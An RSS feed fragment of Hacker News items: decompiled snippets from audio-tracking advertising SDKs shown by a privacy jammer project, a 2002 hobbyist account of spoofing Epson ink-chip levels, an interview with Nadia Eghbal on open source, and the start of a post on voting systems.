            <pubDate>Wed, 11 Nov 2020 00:47:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PilferShush Jammer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25054222">thread link</a>) | @karlzt
<br/>
November 10, 2020 | https://www.cityfreqs.com.au/pilfer.php | <a href="https://web.archive.org/web/*/https://www.cityfreqs.com.au/pilfer.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
            Basic information about how the SDKs code function. They start with a call to the Android/Java API that deals with audio recording and playback. From there with a buffer array full of some audio data, it can then be sent to a native code library that is also installed as part of the SDK. These libraries handle the more CPU intensive work such as sifting through the data using various common methods (Goertzel et al) to find audio signals of interest. 
            </p><p>
            This first section shows some of the Android/Java function calls and parameters used.
            </p><p>
							<strong>alphonso</strong>
              <br>
              ALPHONSO_VERSION = "2.0.46";
              </p><pre>    private static final int RECORDER_AUDIO_BYTES_PER_SEC = 16000;
    private static final int RECORDER_AUDIO_ENCODING = 2;
    private static final int RECORDER_BIG_BUFFER_MULTIPLIER = 16;
    private static final int RECORDER_CHANNELS = 16;
    private static final int RECORDER_SAMPLERATE_44100 = 44100;
    private static final int RECORDER_SAMPLERATE_8000 = 8000;
    private static final int RECORDER_SMALL_BUFFER_MULTIPLIER = 4;
    public static final byte ACR_SHIFT_186 = (byte) 0;
    public static final byte ACR_SHIFT_93 = (byte) 1;
    public static final int ACR_SPLIT = 2;</pre>

              <p><strong>bitsound</strong>
              <br>
              VERSION_NAME = "v4.2.2"
              </p><pre>    public void a(int i) {
      try {
        this.d = new AudioRecord(6, this.b, 16, 2, i);
        if (this.d.getState() == 1) {
          try {
            this.d.startRecording();
            if (this.d.getRecordingState() != 3) {
              b.c(a, "Audio recording startDetection fail");
              this.d.release();
              this.e = false;
              return;
            }
            a(this.d);
            this.e = true;
            return;</pre>
            
              <p><strong>cifrasoft</strong>
              <br>
              VERSION_NAME = "1.0.3"
              </p><pre>    public static final int AUDIO_BUFFER_SIZE_MULTIPLIER = 4;
    public static final int AUDIO_THREAD_STOP_TIMEOUT = 3000;
    public static final int MAX_EMPTY_AUDIO_BUFFER_SEQUENTIAL_READS = 10;
    this.SAMPLE_RATE = 44100;</pre>
    
              <pre>    private int readAudioData(int currentPcmOffset, byte[] pcm) {
      AudioRecordService.handler.sendEmptyMessageDelayed(1, 3000);
      int result = this.mAudioRecord.read(pcm, currentPcmOffset * 2, this.bufferLength * 2);
      AudioRecordService.handler.removeMessages(1);
      return result;
    }</pre>

              <p><strong>copsonic</strong>
              <br>
              CORE_VERSION = "SonicAuth_CORE_v1.2.2.1";
              </p><pre>    "signalType": "ULTRASONIC_TONES",
    "content" : {
        "frequencies" : [ [18000, 20000, "TwoTones"] ]

    "signalType": "ZADOFF_CHU",
    "content": {
      "config": {
        "samplingFreq": 44100,
        "minFreq": 18000,
        "maxFreq": 19850,
        "filterRolloff": 0.5,
        "totalSignalTime": 0.3,
        "nMsgSymbols": 2,
        "filterSpan": 8
      },
      "set": {
        "centralFreq": 18925,
        "nElemSamples": 36,
        "nSymbolElems": 181</pre>

              <p><strong>dv (dov-e)</strong>
              <br>
              VERSION_NAME = "1.1.7"
              </p><pre>    private void recorderWork() {
      if (this.recordingActive) {
        int bytesReadNumber = this.myRecorder.read(this.myBuffer, 0, this.myBuffer.length);
        if (this.recordingActive) {
          DVSDK.getInstance().DVCRxAudioSamplesProcessEvent(this.myBuffer, 0, bytesReadNumber / 2);
        }
      }
    }</pre>
    
              <p><strong>fanpictor</strong>
              <br>
              VERSION_NAME = "3.2.3"
              </p><pre>    enum FNPFrequencyBand {
      Default,
      Low,
      High
    }
              </pre>

              <p><strong>fidzup</strong></p><pre>    a. this.frequency = paramBasicAudioAnalyzerConfig.frequency;   // 19000.0f
    b. this.samplingFrequency = paramBasicAudioAnalyzerConfig.samplingRate;    // 44100.0f
    c. this.windowSize = paramBasicAudioAnalyzerConfig.windowSize;   // 0x200 (512)
    d. /* pulseDuration = 69.66f */
    e. this.pulseWidth = Math.round(paramBasicAudioAnalyzerConfig.pulseDuration * (this.samplingFrequency / 1000.0F));
    f. this.pulseRatio = paramBasicAudioAnalyzerConfig.pulseRatio;   // 32.0f
    /* signalSize = 0x20 (32)
    g. this.signalPeriodPulses = paramBasicAudioAnalyzerConfig.signalSize;
    h. this.bitCounts = paramBasicAudioAnalyzerConfig.bitcounts;   // 0xb (11)</pre>         
            <pre>    paramf.a = 19000.0F;            
    paramf.b = 44100.0F;            
    paramf.c = 512;                 
    paramf.d = 69.66F;              
    paramf.e = 0.33333334F;         
    paramf.f = ((int)(paramf.d * 32.0F * 3.2F)); // 7133.184
    paramf.g = 32;                 
    paramf.h = new int[] { 15, 17, 19, 13, 11, 21, 23, 9, 7, 25, 27 };</pre>             

              <p><strong>fluzo</strong>
              <br>
              VERSION = "1.3.001"</p><pre>    this.p = jSONObject.getInt("frame_length_milliseconds");
    this.q = jSONObject.getInt("frame_step_milliseconds");
    this.r = (float) jSONObject.getDouble("preemphasis_coefficient");
    this.s = jSONObject.getInt("num_filters");
    this.t = jSONObject.getInt("num_coefficients");
    this.u = jSONObject.getInt("derivative_window_size");</pre>
    
              <p><strong>instreamatic</strong>
              <br>
              VERSION_NAME = "7.16.0"</p><pre>    private static final int BUFFER_SECONDS = 5;
    private static int DESIRED_SAMPLE_RATE = 16000;</pre>
 
              <p><strong>lisnr</strong>
              <br>
              VERSION_NAME = "5.0.1.1";
              </p><pre>    // LisnrIDTone          
    public long calculateToneDuration() {
        return ((long) (((double) (this.lastIteration + 1)) * 2.72d)) * 1000;
    }
    // LisnrTextTone
    public long calculateToneDuration() {
        return (long) (((this.text.length() * 6) * 40) + 1280);
    }
    // LisnrDataTone
    public long calculateToneDuration() {
        return (long) (((this.data.length * 6) * 40) + 1280);
    }
    AudioRecord audioRecord = new AudioRecord(0, d, 16, 2, 131072);</pre>  

              <pre>    ArrayAudioPlayer.this.audioOutput = new AudioTrack(3, ArrayAudioPlayer.this.samplerate, 4, 2, 16000, 1);
    ArrayAudioPlayer.this.audioOutput.play();
    int written = 0;
    while (!ArrayAudioPlayer.this.threadShouldStop) {
      try {
        if (ArrayAudioPlayer.this.buffer.getBufferLeftToRead() &gt; 0) {
          int size = ArrayAudioPlayer.this.buffer.getBufferLeftToRead();
          written += size;
          ArrayAudioPlayer.this.audioOutput.write(ArrayAudioPlayer.this.buffer.readFromBuffer(size), 0, size);
          } else {
            ArrayAudioPlayer.this.threadShouldStop = true;
          }
        } catch (IOException e) {
          e.printStackTrace();
        }</pre>
        
              <p><strong>moodmedia</strong>
              <br>
              getVersion() = "1.2.1";
              </p><pre>    b = new AudioRecord(5, 44100, 16, 2, Math.max(AudioRecord.getMinBufferSize(44100, 16, 2) * 4, 32768));
    this.b = Type.SONIC;
    this.b = Type.ULTRASONIC;
    if (num.intValue() == 44100 || num.intValue() == 48000)
    this.j.setName("Demodulator");
    this.k.setName("Decoder");
    this.l.setName("HitCounter");
              </pre>
 
              <p><strong>prontoly (sonarax)</strong>
              <br>
              VERSION_NAME = "4.2.0";
             </p><pre>    contentValues.put("time", cVar.a);
    contentValues.put("type", cVar.b.name());
    contentValues.put(NotificationCompat.CATEGORY_EVENT, cVar.c);
    contentValues.put("communication_type", cVar.d);
    contentValues.put("sample_rate", cVar.e);
    contentValues.put("range_mode", cVar.f);
    contentValues.put("data", cVar.g);
    contentValues.put("duration", cVar.h);
    contentValues.put("count", cVar.i);
    contentValues.put("volume", cVar.j);</pre>
    
              <p><strong>realitymine</strong>
              <br>
              getSdkVersion = "5.1.6";
              </p><pre>    this.e = AudioRecord.getMinBufferSize(44100, 16, 2);
    int i = this.e;
    this.d = new byte[i];
    this.c = new AudioRecord(1, 44100, 16, 2, i);</pre>

              <p><strong>redbricklane (zapr)</strong>
              <br>
              SDK_VERSION = "3.3.0";
              </p><pre>    AudioRecord localAudioRecord = new AudioRecord(1, 8000, 16, 2, 122880);
    if (localAudioRecord.getState() == 1) {
      this.logger.write_log("Recorder initialized", "finger_print_manager");
      this.logger.write_log("Recording started", "finger_print_manager");
      localAudioRecord.startRecording();</pre>

              <p><strong>runacr</strong>
              <br>
              release = "1.0.4"
              </p><pre>    int minBufferSize = AudioRecord.getMinBufferSize(11025, 16, 2);
    this.K = new AudioRecord(6, 11025, 16, 2, minBufferSize * 10);</pre>

              <p><strong>shopkick</strong></p><pre>    .field bitDetectThreshold:Ljava/lang/Double;
    .field carrierThreshold:Ljava/lang/Double;
    .field detectThreshold:Ljava/lang/Double;
    .field frFactors:Ljava/lang/String;
    .field gapInSamplesBetweenLowFreqAndCalibration:Ljava/lang/Integer;
    .field maxFracOfAvgForOne:Ljava/lang/Double;
    .field maxIntermediates:Ljava/lang/Integer;
    .field minCarriers:Ljava/lang/Integer;
    .field noiseThreshold:Ljava/lang/Double;
    .field numPrefixBitsRequired:Ljava/lang/Integer;
    .field numSamplesToCalibrateWith:Ljava/lang/Integer;
    .field presenceDetectMinBits:Ljava/lang/Integer;
    .field presenceNarrowBandDetectThreshold:Ljava/lang/Double;
    .field presenceStrengthRatioThreshold:Ljava/lang/Double;
    .field presenceWideBandDetectThreshold:Ljava/lang/Double;
    .field useErrorCorrection:Ljava/lang/Boolean;
    .field wideBandPresenceDetectEnabled:Ljava/lang/Boolean;
    .field highPassFilterType:Ljava/lang/Integer;</pre>
              <pre>    Java_com_shopkick_app_presence_NativePresencePipeline_setDopplerCorrectionEnabledParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setHighPassFilterEnabledParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setWideBandDetectEnabledParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setNumPrefixBitsRequiredParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setPresenceDetectNarrowBandDetectThresholdFCParam
    …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cityfreqs.com.au/pilfer.php">https://www.cityfreqs.com.au/pilfer.php</a></em></p>]]>
            </description>
            <link>https://www.cityfreqs.com.au/pilfer.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054222</guid>
            <pubDate>Wed, 11 Nov 2020 00:46:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eddie's Ink Chip Hack (2002)]]>
            </title>
            <description>
<![CDATA[
Score 78 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25054177">thread link</a>) | @userbinator
<br/>
November 10, 2020 | http://www.eddiem.com/photo/CIS/inkchip/chip.html | <a href="https://web.archive.org/web/*/http://www.eddiem.com/photo/CIS/inkchip/chip.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<tr>
<td>
<p lang="en-GB"><a href="http://www.eddiem.com/photo/CIS/cis.htm">My CIS page.</a></p></td>
<th>
<p lang="en-GB"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/inkchip.JPG" name="Graphic2" width="401" height="400"></p></th>
<td>
<p lang="en-GB"><a href="http://www.eddiem.com/photo/printer/chipreset/resetchip.html">Part
				2 build your own reseter</a></p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><strong>What is a Intellidge ink chip.</strong><span size="5"><br>
</span>Epson fit
				small circuit boards to most of their ink cartridges. These
				record the amount of ink that is estimated to be in the
				cartridge. I read that the official epson line is that it is for
				the customers benefit and not an anti-refill device. Whether you
				believe this or not they are a bloody nuisance to anyone wanting
				to refill the cartridges or use bulk ink. It also stops people
				using old cartridges full of solvent for cleaning the heads.
				Another problem was early printer models didn't check if the
				cartridge had been changed while power was on. This was good if
				you wanted to trick the printer into copying a “full”
				chip to and empty one, however the reverse was also true and you
				could easily copy and “empty” one into your full
				one.<br>
They are just a small memory device holds 32 bytes of
				data, they do not measure real ink level and nor does the
				printer. The printer reads the chips on startup, estimates
				(sometimes badly) how much ink should have been used and writes
				this back at shutdown. They hold other data as well.<br>
So epson
				go to the trouble of fitting chips to cartridges and building all
				the extra sockets, wiring, electronics and software into the
				printer so you can use the computer to see the predicted level
				and it can stop you printing if it think you've used enough ink.
				High-end Canon's on the other hand make the inks tank clear so
				you can see and have optical sensor to detect emptiness. This
				make a lot more sense – unless you are making an
				anti-refill device that is. Canon almost got my business this
				time but nobody I could find has run pigment in them – too
				risky.<br>
To get around the chip problems someone usually end up
				producing read-only chip which always read full (for use with
				CIS) and chip reseters for those who want to refill. These are
				not available for 2100p at the time of writing as far as I can
				tell.<br>
Before ordering my 2100p I did my homework and it seemed
				fairly likely a chip reseter would become available at some point
				and read-only chips as well. I was also cocky enough to think I
				could crack it myself and I have. It didn't go quite as expected
				though.<br>
<strong>What do I want to do?</strong><br>
I want the easiest way
				to fool the printer into believing it has full cartridges present
				so I can build my CIS.<br>
<strong>What did I expect?</strong><br>
A logical
				interface for Intellidge is i2c (i squared c) or TWI (two wire
				interface). Then the chip could just be some standard i2c eeprom.
				The Intellidge have too many pads for this but I was hopeful.
				After that would could SPI or microwire – again this could
				use off the shelf parts. If the chips were micro-controllers then
				plain asynchronous serial would be my choice.<br>
<strong>I had a
				look.</strong><br>
To do this I use a AVR mega323 micro, I declined
				offers of logic analyzers being a homebrew type of guy. The 323
				has 2K of internal ram which is enough for some minimalist data
				logging. It was about $50AUS in parts ($30US) to make. I wired a
				cartridge to bring the signals out and took a quick look with a
				voltmeter.<br>
<strong>Nothing!</strong><br>
There was nothing there. I
				expected some power but no, the chips are only powered briefly
				when the are accessed. I used leds to get a rough idea what was
				what and hooked up the micro via resistors to give some degree of
				protection to the printer if I screwed up. The code in the micro
				was written is assembler and captured data sent via rs232 to my
				PC where I wrote a delphi program to display and process the
				data.</p></td></tr>
<tr>
<td colspan="3">
</td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><a href="http://www.eddiem.com/photo/CIS/inkchip/traces.html"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/fastendsml.gif" name="Graphic5" width="615" height="213"></a><br>
<a href="http://www.eddiem.com/photo/CIS/inkchip/traces.html">Click
				here for more traces.</a></p>
<p lang="en-GB">This is the sort of thing I got. No
				protocol I ever seen. Obviously synchronous with bi-directional
				data, very short format. I was confused a little by how short it
				was - because I expect much better precision for the ink
				level.<br>
The traces seem to be.<br>
Top – some sort of sync
				line, this always goes low before the start of transmission.<br>
Next
				– power this goes low (off) between chip reads at printer
				startup but stays high during the shutdown – when data is
				written to the chip.<br>
Next – the clock, data is read of
				the rising edge and changed on the falling.<br>
Bottom –
				bi-directional data, the first 4 bits are always from printer to
				the chip, the rest depend on whether it is a read or write. LSB
				first (left).</p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB">Convert to binary and some patterns emerge.<br>
It
				was not real obvious how the chips were addressed or which bits
				encoded ink levels. Some more data when some ink had been used
				made it easier.</p>
<p lang="en-GB">Below is one chip being read at startup, there
				are 7 accesses one for each chip. Only 3 block have data –
				the other chips must be hooked to different data lines.</p>
<div lang="en-GB"><p><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/strtbinary.gif" name="Graphic6" width="818" height="45"></p></div></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB">Below is the complete shutdown stream. Again we
				can only see 3 chips from here.</p>
<p lang="en-GB"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/endbinary.gif" name="Graphic7" width="297" height="199"><br clear="left">
After
				printing a few bits near the beginning of the bit stream did
				change. It looks to me like the first 3 bits are the chip address
				the next is a write bit then the ink level, I get the feeling
				there aren't many bits used to encode it (later looks like 6).<br>
So
				– the top one shows 252 bits of data being read out of the
				chip.<br>
The first part of the shutdown shows just the ink level
				being read out, this is to check the same chip is there.<br>
The
				second part is the ink-level and some other stuff (printer serial
				number maybe) being written into the chip. Seeing I didn't use
				any ink the bit-stream is identical to the read except for bit 3
				– presumably the write bit.</p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><span size="5"><br>
Tuesday
				24 Sept 2002. I fooled the printer.</span></p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/spoofed.gif" name="Graphic8" width="381" height="363"><span size="3">The
				interesting thing about this screen grab is the black cartridge
				is really only two thirds full. I spoofed the printer by pulling
				the serial data line low during the time the ink level bits are
				being clocked out of the ink chip.<br>
This is means 6 bits
				starting at the 5'th bit in the stream.</span></p>
<p lang="en-GB"><span size="3">The first 3 bits appear to be the
				chip address, I guess the next is a read/write select. I used a
				AVR mega323 to detect the start of the serial transmission look
				for the address of chip1+read (black apparently) then pull data
				low for 6 clock edges. </span></p>
<p lang="en-GB"><span size="3">I'm sure I can reset 3 of the chips
				by tapping into chip1 signal. Reseting the rest will mean tapping
				into at least one more. </span></p>
<p lang="en-GB"><span size="3">The current set up is for
				experimentation only – it is not “the real thing”.</span></p>
<p lang="en-GB"><span size="3">Shorting the data to ground may be a
				bit drastic but it is only for a very brief time. I hoped the
				data line would be open collector but this doesn't seem to be the
				case.</span></p></td></tr></div></div>]]>
            </description>
            <link>http://www.eddiem.com/photo/CIS/inkchip/chip.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054177</guid>
            <pubDate>Wed, 11 Nov 2020 00:41:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nadia Eghbal on working (and writing) in public]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25053962">thread link</a>) | @jger15
<br/>
November 10, 2020 | https://www.thepullrequest.com/p/nadia-eghbal | <a href="https://web.archive.org/web/*/https://www.thepullrequest.com/p/nadia-eghbal">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3b69c75-0c5b-4746-b998-5b41a1064a8d_900x1200.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3b69c75-0c5b-4746-b998-5b41a1064a8d_900x1200.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a3b69c75-0c5b-4746-b998-5b41a1064a8d_900x1200.jpeg&quot;,&quot;height&quot;:1200,&quot;width&quot;:900,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:399616,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p><em>                                                                                              Portrait by <a href="https://www.katiasobolski.com/">Katia Sobolski</a>.</em></p><p><strong>Nadia Eghbal is uniquely positioned to write about open source having spent almost two years in developer relations at the Alexandrian library of open source, GitHub. She then spent two years continuing her quasi-anthropological study of open source at Protocol Labs, and now works in writer relations at Substack (host of this publication). Her new book is <a href="https://www.amazon.com/Working-Public-Making-Maintenance-Software/dp/0578675862/">Working in Public: The Making and Maintenance of Open Source Software</a>, which like her career trajectory, starts in open source software but ends up grappling with larger issues of creators in an unbundled digital economy. </strong><em><strong><a href="https://pullrequest.substack.com/p/the-glory-of-achievement">The Pull Request</a></strong></em><strong><a href="https://pullrequest.substack.com/p/the-glory-of-achievement"> review is here</a>.</strong></p><p><em>AGM: My naive mental model of open-source was this almost communitarian kibbutz model. And yet, the big lesson from your book is that that’s not really how it works. </em></p><p>NE: Part of the reason why I wrote this book was because I feel like we've had this communitarian kibbutz kind of model, which you've identified, is the prevailing model that people understand in open source and that gets frequently talked about. And I think that narrative has kind of been owned by the likes of [Richard] Stallman or Eric Raymond or anyone who kind of remembers those early days of open source. And that model definitely still exists within the matrix of different community models. The ‘clubs’ are kind of like that, where everyone is rolling up their sleeves and there's lots of different active contributors. And then we also have  the ‘federations’ that are kinda like the really big open source projects that we're used to thinking about like Linux, but then there’s the rise of the ‘stadium’ model that is, I think, much newer.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8c16a1d6-74cc-4eab-9640-b6dd860b29cb_934x408.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8c16a1d6-74cc-4eab-9640-b6dd860b29cb_934x408.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8c16a1d6-74cc-4eab-9640-b6dd860b29cb_934x408.png&quot;,&quot;height&quot;:408,&quot;width&quot;:934,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:57769,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></p><p><em>The Eghbal model of open-source communities (referenced copiously here), whose contours are readily applicable more broadly.</em></p><p>If you look at what's happened to open source for the past 20 years, at some point demand outpaced supply and the amount of context that anyone can really have around any one open source project—because every developer is relying on like hundreds of different projects—it's not really possible to become this roll-up-your-sleeves member of every single project. And so, yeah, I think the governance does look really different and it’s specifically something that I didn't want to bang people over the head about it in the book. But I think a stadium model lends itself a little bit more to that kind authoritarian model and there’s less the kind of governance issues that we see in like a federation where people are like <em>this is a democracy!</em> and everyone is gonna ask everyone for opinions and stuff even if you might only have one or a few contributors. The contributors [in a stadium] are kind of just making the decisions and I think they should feel comfortable leaning into that. Even though right now I think a lot of them feel uncomfortable doing that because they keep being told that open source is supposed to this super participatory thing.</p><p><em>AGM: And you think that it doesn't necessarily have to be.</em></p><p>NE: I think the tension in one of these stadium models is where you do have a lot of users. And then you have some of these casual contributors who are opening issues, making feature requests or just lost, and you are kind of sorting through all that volume from people that you don't know. In my view, it's kind of like, well, I don't understand why should that person have a say in your project, if they've never looked at it before, and they're just kind of coming in for the first time and you're the core developer of the project. </p><p>There is a set of rhetoric in open source that says every person is a contributor, and anyone who kind of comes in, you should treat them as a contributor and like invest in them and all this stuff, but I don't feel like we would do that for anything else. If you had a hobby meetup kind of group with you and your friends and someone came in once and then was like <em>I think we should runs a group like this</em>, you'd be like: W<em>ho are you?</em> <em>This is this is our thing. </em>I think I want people to feel more comfortable saying that. And there's obvious parallels between that and the Internet at large right now.</p><p><em>AGM: You took the words right out of my mouth. In the book, you’ve got a long riff on the <a href="https://en.wikipedia.org/wiki/Tragedy_of_the_commons">tragedy of the commons</a>. Not that I want to turn this interview into a Facebook thing, because having worked there and spent part of my career on it, it's like the last thing I want to talk about…but I do think it's somewhat relevant in that, Twitter or Facebook, is it actually the public forum and a commons? Can Zuck or Jack run it as you suggest? Can they run it like [Guido] van Rossum does Python, as officially-titled Benevolent Dictator For Life? In some sense that’s actually better? </em></p><p>NE: Yeah. Well, I don't think Facebook is a commons anymore, just by sheer size that we’re dealing with. One of the things that I'm trying to do in the book is go back through Elinor Ostrom’s definition of a commons and saying, okay, she makes the argument that we can avoid this tragedy of the commons by having people self govern. But she has very specific rules that she's laid out around what actually qualifies something as a commons, so we can self govern in a healthy way, assuming these conditions hold and a lot of those conditions have to do with having clear membership boundaries and very high context for your interactions with each other. And so if you think just about Facebook being 2.6 billion people or however many people are on Facebook now, it's impossible that literally multiple billions of people all have that kind of context for each other. I think of Facebook as being this substrate that fosters a bunch of smaller communities. You might have Facebook Messenger which resembles more like the group chats or the ‘club’-style communities. You might have the ‘stadium’ type situations that are more like one person broadcasting out to a group of people and you might have Facebook groups which could be like either ‘clubs’ or ‘federations’ depending how big they are. You actually have a permutation of lots of different types of communities that are across the entire platform. But I think having that kind of vocabulary can help us figure out, what does it actually mean to develop governance for any of these platforms? It's the same thing with Twitter also. I don't see a world where we have one policy or a certain set of guidelines. </p><p><em>AGM: That’s a somewhat shocking statement.</em></p><p>NE: Yeah, it's so it's funny that that’s controversial. Part of what I was trying to do in the book is saying like, okay, let's not like talk about social media, let's just talk about this other weird thing called open source. And let's look at the dynamics there and how that's evolved for 20 years. Can you depersonalize this a little bit and if you agree with me that these things seem to be happening in open source. And stacking this up against other economic frameworks we've had in the past, like the commons, and it doesn't seem to hold here, then can we take that conclusion and transfer it back over somewhere else…</p><p><em>AGM: Okay, that's the vibe I got from your book that you were trying to actually talk about the rest of it. So it's good to know that I wasn't over-reading into it. </em></p><p>NE: I was trying to be sensible about it. </p><p><em>AGM: Do you think the push on Facebook for content moderation, and Twitter, is a fool's errand? You know how Kevin Roose and Charles Warzel of </em>The Times<em> and that whole whiny mob that's constantly trying to get them to moderate everything. You think that's probably not the way forward?</em></p><p>NE: It seems beyond not just gonna happen, it seems actively wrong to me. It’s as though we're asking another country to govern the United States or something. I'm trying to look at where do those governance boundaries start and who should be moderating themselves or not, and just the thought that you would have a sort of widespread platform governance on some of these issues just seems, yeah, morally wrong to me.</p><p><em>AGM: Are you a free-speech absolutist, Nadia, that rarest of breeds?</em></p><p>NE: I'm not super public about my politics, but then I don’t mind poking my head out a little bit around it and publishing the book was kind of part of this for me because, to be totally frank, there are these democratic kind of ideals and these like communist-y ideals that we are holding about both the Internet and open source which are driving me crazy and, I'm trying to point out, you know, that's not always the case. And sometimes it's about one person who was doing a lot of things and we're just like couching it in a group cooperative. Yeah, I don't really know what my politics are, but I definitely err as far to that side as possible, as I think is reasonable. I do think this kind of moderation stuff, no one really has the answer to it. And so I'm not gonna sit here and be like, <em>I know how to fix it!</em> No one knows how to fix Facebook. Or any of these platforms. There's there's some humility that should be in place there, but I know what I stand for and what I'm aiming for.</p><p><em>AGM: I dislike looking always at the extreme example. But you know, Balaji [Srinivasan] had this whole dust-up with Taylor Lorenz and he's constantly getting into fights with these media people. And it's weird because he's often so right in so many ways, and he's good at getting attention. But somehow he hasn't parlayed into a mainstream following. </em></p><p>NE: I do feel like we need to have institutions a little bit in order to reinforce that. Well, I don't know if that's true or not, because people do follow like Elon Musk or Joe Rogan, or whatever. So that does exist. But I feel it would be so nice that if we had a publication that we could be proud of, that people would read outside of tech. There's no legible symbols for someone else to kind of follow. Like it's even weird that the most popular tech figures are not always the most popular figures actually in tech. Like Mark Cuban …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thepullrequest.com/p/nadia-eghbal">https://www.thepullrequest.com/p/nadia-eghbal</a></em></p>]]>
            </description>
            <link>https://www.thepullrequest.com/p/nadia-eghbal</link>
            <guid isPermaLink="false">hacker-news-small-sites-25053962</guid>
            <pubDate>Wed, 11 Nov 2020 00:16:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing Voting Systems]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25053892">thread link</a>) | @shihn
<br/>
November 10, 2020 | https://shihn.ca/posts/2020/voting-systems/ | <a href="https://web.archive.org/web/*/https://shihn.ca/posts/2020/voting-systems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      
<h2>Introduction</h2>
<p>We encounter voting in some form around us all the time. We rate our Uber drivers, they rate us back. We up-vote and down-vote posts and trolls on Reddit. We give stars to movies and restaurants. We vote on who gets kicked out of our favorite reality television show. We vote for Presidents.</p>
<p>All these voting systems seem a bit different from one another, but one thing that's definitely common among them — we will find ways to complain about them. The way a voting system is designed can make an <em>election</em> trivial or really complicated in nature. In fact, sometimes, the winner of an election may be determined by the rules of the voting system and not the intent of the voters (electoral college anyone?). In this post I try to explore the core of different voting systems and wonder if there is a perfect voting system.</p>
<p>Here I am going to use the word <em>election</em> to define an event or a goal that requires voting. An election doesn't have to be political in nature.</p>
<p><em>Note and Acknowledgement: This blog post is influenced by the chapter on voting systems in video games in the book Power-Up by Matthew Lane.</em></p>
<h2>Plurality Voting</h2>
<p>This is the simplest form of voting. Most political elections in the United States are done using this form of voting. It's quite simple — every voter casts a vote for their favorite candidate. The candidate with the most number of votes wins.</p>
<p>Let's look at an example that we will continue to use in this post. We ask 100 people to vote for their favorite flavor of ice cream. The candidates are <em>Vanilla</em>, <em>Chocolate</em>, and <em>Strawberry</em>. Here's the result:</p>
<table>
<thead>
<tr>
<th>Flavor</th>
<th>Votes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>45</td>
</tr>
<tr>
<td>Chocolate</td>
<td>40</td>
</tr>
<tr>
<td>Strawberry</td>
<td>15</td>
</tr>
</tbody>
</table>
<p><strong>Vanilla has won!</strong> Now if you stare at the numbers a bit, you will find some downsides in declaring Vanilla the winner in this election of the flavors.</p>
<p>An obvious one is that more votes were cast for a flavor that is not the winning flavor. You could also argue that no flavor should win because none of them reached a majority.</p>
<p>Here Strawberry is acting as a <strong>spoiler</strong> — similar to how third-party candidates in US elections can be considered spoilers. Maybe we should have a <strong><em>run-off election</em></strong> where only Vanilla and Chocolate are considered. Perhaps more people favor Chocolate over Vanilla when Strawberry is out of the picture. (The US state of Georgia has rules akin to this. In the 2020 elections for the senate seats in Georgia, none of the candidates achieved a majority. So run-off elections will be held in January of 2021 with the top two candidates).</p>
<p>The essence of the Plurality voting system is that it does not capture the full spectrum of voters' preferences. If someone voted for Strawberry, it does not tell us how they feel about Vanilla or Chocolate.</p>
